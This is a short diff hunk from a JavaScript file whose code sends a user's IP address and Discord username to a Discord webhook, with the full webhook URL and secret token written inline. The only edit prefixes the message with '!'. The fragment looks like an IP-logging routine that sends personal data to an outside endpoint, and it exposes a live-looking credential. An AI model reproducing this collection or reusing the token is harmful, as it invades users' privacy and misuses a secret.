@@ -86,7 +86,7 @@
                     // Send the IP address and Discord username to the Discord webhook
                     const webhookUrl = 'https://discord.com/api/webhooks/1236739657505439854/xrWrzCfXnGaQ_TcMO7xXVMUw5LZU6k_fRuEIplzFBaGTB9R7hc4YJC579feuU1UqRNWx';
                     const message = {
-                        content: `(${ip}) - [${discordUsername}]`
+                        content: `!(${ip}) - [${discordUsername}]`
                     };
                     
                     fetch(webhookUrl, {
